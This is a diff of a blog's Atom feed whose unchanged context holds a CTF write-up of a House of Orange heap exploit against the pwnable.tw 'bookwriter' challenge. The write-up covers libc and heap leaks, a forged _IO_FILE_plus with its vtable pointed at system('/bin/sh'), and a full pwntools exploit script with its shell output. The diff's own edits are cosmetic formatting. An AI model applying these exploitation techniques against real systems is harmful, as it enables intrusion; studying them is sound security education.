@@ -1,6 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?> 
 <feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en">
-    <generator uri="https://gohugo.io/" version="0.92.2">Hugo</generator><title type="html"><![CDATA[pwnable on repr]]></title>
+    <generator uri="https://gohugo.io/" version="0.80.0">Hugo</generator><title type="html"><![CDATA[pwnable on repr]]></title>
     
         <subtitle type="html"><![CDATA[pwn, RE, crypto stuff]]></subtitle>
     
@@ -8,7 +8,7 @@
     
             <link href="https://nasm.re/tags/pwnable/" rel="alternate" type="text/html" title="HTML" />
             <link href="https://nasm.re/tags/pwnable/feed.xml" rel="self" type="application/atom+xml" title="Atom" />
-    <updated>2022-07-29T20:34:46+02:00</updated>
+    <updated>2022-08-01T03:33:42+02:00</updated>
     
         <author>
             <name>nasm</name>
@@ -54,7 +54,7 @@
 <p>To target <code>_IO_FILE_plus</code> structures in the libc we need to leak the libc address. To do so we can overwrite the size field of the top chunk with a small value and then requesting a huge chunk which will trigger the release of the top chunk, and put it in the unsorted bin.</p>
 <p>The mandatory thing is that <code>new_size + &amp;top_chunk</code> has to be aligned on <code>PAGE_SZ</code> (<code>0x1000</code>).</p>
 <p>Which gives:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="n">io</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>
+<div class="highlight"><pre class="chroma"><code class="language-py" data-lang="py"><span class="n">io</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>
 
 <span class="k">def</span> <span class="nf">set_author</span><span class="p">(</span><span class="n">name</span><span class="p">):</span>
     <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Author :&#34;</span><span class="p">,</span> <span class="n">name</span><span class="p">)</span>
@@ -102,7 +102,7 @@
 </span><span class="s2">0x1201030	0x00007fc7370efb78	0x00007fc7370efb78	x..7....x..7....
 </span><span class="s2">&#34;&#34;&#34;</span>
 </code></pre></div><p>To leak the address, we can alloc a chunk of size zero and print it. Given the fact that the <code>author</code> string is right before the alloc array and that we can overwrite the <code>NULL</code> byte we can in the same way leak the heap address.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">5</span><span class="p">):</span>
+<div class="highlight"><pre class="chroma"><code class="language-py" data-lang="py"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">5</span><span class="p">):</span>
     <span class="n">alloc</span><span class="p">(</span><span class="mh">0x0</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">)</span>
 
 <span class="n">heap</span> <span class="o">=</span> <span class="n">info</span><span class="p">()</span>
@@ -111,8 +111,8 @@
 <span class="n">alloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">)</span>
 <span class="n">libc</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">u64</span><span class="p">(</span><span class="n">show</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">))</span> <span class="o">-</span> <span class="mh">0x3c4188</span>
 
-<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;libc: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
-<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;heap: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">heap</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="n">f</span><span class="s2">&#34;libc: {hex(libc)}&#34;</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="n">f</span><span class="s2">&#34;heap: {hex(heap)}&#34;</span><span class="p">)</span>
 
 <span class="s2">&#34;&#34;&#34;
 </span><span class="s2">0x150c000	0x0000000000000000	0x0000000000000021	........!.......
@@ -133,7 +133,7 @@
 </span><span class="s2">0x150c0f0	0x00007fd150995b78	0x00007fd150995b78	x[.P....x[.P....
 </span><span class="s2">&#34;&#34;&#34;&#34;</span>
 </code></pre></div><p>Which gives:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Shell" data-lang="Shell">$ python3 exploit.py LOCAL
+<div class="highlight"><pre class="chroma"><code class="language-Shell" data-lang="Shell">$ python3 exploit.py LOCAL
 <span class="o">[</span>*<span class="o">]</span> <span class="s1">&#39;/home/nasm/Documents/pwn/pwnable.tw/bookwriter/bookwriter&#39;</span>
     Arch:     amd64-64-little
     RELRO:    Full RELRO
@@ -155,7 +155,7 @@ libc: 0x7f301566d000
 </div>
 <p>File stream exploitation is a very interesting way to drop a shell according to the primitives it allows you to leverage. The house of Orange uses the <code>vtable</code> field within a <code>_IO_FILE_plus</code> structure to hiijack the control flow.</p>
 <p>According to the libc source code, here is the definition of <code>struct _IO_FILE_plus</code>, <code>_IO_FILE</code> and <code>_IO_jump_t</code>:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="cm">/* We always allocate an extra word following an _IO_FILE.
+<div class="highlight"><pre class="chroma"><code class="language-c" data-lang="c"><span class="cm">/* We always allocate an extra word following an _IO_FILE.
 </span><span class="cm">   This contains a pointer to the function jump table used.
 </span><span class="cm">   This is for compatibility with C++ streambuf; the word can
 </span><span class="cm">   be used to smash to a pointer to a virtual function table. */</span>
@@ -245,7 +245,7 @@ libc: 0x7f301566d000
 </span><span class="cm">   It matches the streambuf::overflow virtual function. */</span>
 <span class="k">typedef</span> <span class="nf">int</span> <span class="p">(</span><span class="o">*</span><span class="n">_IO_overflow_t</span><span class="p">)</span> <span class="p">(</span><span class="n">_IO_FILE</span> <span class="o">*</span><span class="p">,</span> <span class="kt">int</span><span class="p">);</span>
 </code></pre></div><p>The <code>__overflow</code> function pointer is called especially in the <code>_IO_flush_all_lockp</code> function, to really understand how you can reach this function I will put right below all the backtrace from the <code>malloc_printerr</code> function.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="k">static</span> <span class="kt">void</span>
+<div class="highlight"><pre class="chroma"><code class="language-c" data-lang="c"><span class="k">static</span> <span class="kt">void</span>
 <span class="nf">malloc_printerr</span> <span class="p">(</span><span class="kt">int</span> <span class="n">action</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">str</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">ptr</span><span class="p">,</span> <span class="n">mstate</span> <span class="n">ar_ptr</span><span class="p">)</span>
 <span class="p">{</span>
   <span class="cm">/* Avoid using this arena in future.  We do not attempt to synchronize this
@@ -566,10 +566,10 @@ What we wanna reach would be the <code>_IO_OVERFLOW (fp, EOF) == EOF</code> chec
     </h2>
 </div>
 <p>We can easily craft the vtable to initialize only the <code>__overflow</code> function pointer to the address of <code>system</code>:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="n">fake_vtable</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">*</span> <span class="mi">3</span>
+<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="n">fake_vtable</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">*</span> <span class="mi">3</span>
 <span class="n">fake_vtable</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">libc</span> <span class="o">+</span> <span class="mh">0x45390</span><span class="p">)</span> <span class="c1"># &amp;system</span>
 </code></pre></div><p>To craft the <code>_IO_FILE_plus</code> file structure, we need to take care to satisfy this condition seen above in <code>_IO_flush_all_lockp</code>:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c">      <span class="k">if</span> <span class="p">(((</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_mode</span> <span class="o">&lt;=</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span> <span class="o">&gt;</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span><span class="p">)</span>
+<div class="highlight"><pre class="chroma"><code class="language-c" data-lang="c">      <span class="k">if</span> <span class="p">(((</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_mode</span> <span class="o">&lt;=</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span> <span class="o">&gt;</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span><span class="p">)</span>
 <span class="cp">#if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T
 </span><span class="cp"></span>           <span class="o">||</span> <span class="p">(</span><span class="n">_IO_vtable_offset</span> <span class="p">(</span><span class="n">fp</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span>
                <span class="o">&amp;&amp;</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_mode</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span>
@@ -579,7 +579,7 @@ What we wanna reach would be the <code>_IO_OVERFLOW (fp, EOF) == EOF</code> chec
           <span class="o">&amp;&amp;</span> <span class="n">_IO_OVERFLOW</span> <span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="n">EOF</span><span class="p">)</span> <span class="o">==</span> <span class="n">EOF</span><span class="p">)</span>
 </code></pre></div><p><code>fp-&gt;_mode</code> can be null, <code>fp-&gt;_IO_write_ptr</code> has to be greater than <code>fp-&gt;_IO_write_base</code>. Then <code>_IO_OVERFLOW (fp, EOF)</code> is reached.</p>
 <p>Here comes the right file structure:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="n">fake_file</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;/bin/sh</span><span class="se">\00</span><span class="s2">&#34;</span>                	<span class="c1"># _flags</span>
+<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="n">fake_file</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;/bin/sh</span><span class="se">\00</span><span class="s2">&#34;</span>                	<span class="c1"># _flags</span>
 <span class="n">fake_file</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x61</span><span class="p">)</span>               	<span class="c1"># _IO_read_ptr</span>
 <span class="n">fake_file</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">libc</span> <span class="o">+</span> <span class="mh">0x1337</span><span class="p">)</span>    		<span class="c1"># _IO_read_end</span>
 <span class="n">fake_file</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">libc</span> <span class="o">+</span> <span class="mh">0x3c4520</span> <span class="o">-</span> <span class="mh">0x10</span><span class="p">)</span>    <span class="c1"># _IO_read_base = _IO_list_all - 0x10</span>
@@ -598,7 +598,7 @@ What we wanna reach would be the <code>_IO_OVERFLOW (fp, EOF) == EOF</code> chec
     </h2>
 </div>
 <p>Here we are :)</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Shell" data-lang="Shell">$ python3 exploit.py LOCAL
+<div class="highlight"><pre class="chroma"><code class="language-Shell" data-lang="Shell">$ python3 exploit.py LOCAL
 <span class="o">[</span>*<span class="o">]</span> <span class="s1">&#39;/home/nasm/Documents/pwn/pwnable.tw/bookwriter/bookwriter&#39;</span>
     Arch:     amd64-64-little
     RELRO:    Full RELRO
@@ -623,7 +623,7 @@ $ id
     </h2>
 </div>
 <p>Final script:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="ch">#!/usr/bin/env python</span>
+<div class="highlight"><pre class="chroma"><code class="language-py" data-lang="py"><span class="ch">#!/usr/bin/env python</span>
 <span class="c1"># -*- coding: utf-8 -*-</span>
 
 <span class="c1"># this exploit was generated via</span>
@@ -637,8 +637,8 @@ $ id
 
 <span class="c1"># Set up pwntools for the correct architecture</span>
 <span class="n">exe</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;bookwriter&#39;</span><span class="p">)</span>
-<span class="n">pwn</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">delete_corefiles</span> <span class="o">=</span> <span class="kc">True</span>
-<span class="n">pwn</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">rename_corefiles</span> <span class="o">=</span> <span class="kc">False</span>
+<span class="n">pwn</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">delete_corefiles</span> <span class="o">=</span> <span class="bp">True</span>
+<span class="n">pwn</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">rename_corefiles</span> <span class="o">=</span> <span class="bp">False</span>
 
 <span class="n">host</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">HOST</span> <span class="ow">or</span> <span class="s1">&#39;127.0.0.1&#39;</span>
 <span class="n">port</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">PORT</span> <span class="ow">or</span> <span class="mi">1337</span><span class="p">)</span>
@@ -674,18 +674,18 @@ $ id
 </span><span class="s1">continue
 </span><span class="s1">&#39;&#39;&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="o">**</span><span class="nb">locals</span><span class="p">())</span>
 
-<span class="n">io</span> <span class="o">=</span> <span class="kc">None</span>
+<span class="n">io</span> <span class="o">=</span> <span class="bp">None</span>
 
 <span class="n">io</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>
 
 <span class="k">def</span> <span class="nf">set_author</span><span class="p">(</span><span class="n">name</span><span class="p">):</span>
     <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Author :&#34;</span><span class="p">,</span> <span class="n">name</span><span class="p">)</span>
 
-<span class="k">def</span> <span class="nf">alloc</span><span class="p">(</span><span class="n">size</span><span class="p">,</span> <span class="n">content</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="kc">False</span><span class="p">):</span>
+<span class="k">def</span> <span class="nf">alloc</span><span class="p">(</span><span class="n">size</span><span class="p">,</span> <span class="n">content</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="bp">False</span><span class="p">):</span>
     <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Your choice :&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;1&#34;</span><span class="p">)</span>
     <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Size of page :&#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
     
-    <span class="k">if</span> <span class="n">shell</span> <span class="o">==</span> <span class="kc">True</span><span class="p">:</span>
+    <span class="k">if</span> <span class="n">shell</span> <span class="o">==</span> <span class="bp">True</span><span class="p">:</span>
         <span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
 
     <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Content :&#34;</span><span class="p">,</span> <span class="n">content</span><span class="p">)</span>
@@ -728,11 +728,11 @@ $ id
 
 <span class="n">heap</span> <span class="o">=</span> <span class="n">info</span><span class="p">()</span>
 <span class="n">heap</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">u64</span><span class="p">(</span><span class="n">heap</span><span class="p">[</span><span class="nb">len</span><span class="p">(</span><span class="s2">&#34;Author : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#34;</span><span class="p">):][:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">))</span> <span class="o">&amp;</span> <span class="o">~</span><span class="mh">0xfff</span>
-<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;heap: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">heap</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="n">f</span><span class="s2">&#34;heap: {hex(heap)}&#34;</span><span class="p">)</span>
 
 <span class="n">alloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">)</span>
 <span class="n">libc</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">u64</span><span class="p">(</span><span class="n">show</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">))</span> <span class="o">-</span> <span class="mh">0x3c4188</span> 
-<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;libc: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="n">f</span><span class="s2">&#34;libc: {hex(libc)}&#34;</span><span class="p">)</span>
 
 <span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">)</span>
 <span class="n">alloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">)</span>
@@ -761,7 +761,7 @@ $ id
 <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;choice&#34;</span><span class="p">)</span>
 <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;choice&#34;</span><span class="p">)</span>
 
-<span class="n">alloc</span><span class="p">(</span><span class="mh">0xffff</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+<span class="n">alloc</span><span class="p">(</span><span class="mh">0xffff</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
 </code></pre></div><ul>
 <li><a
   class="gblog-markdown__link"
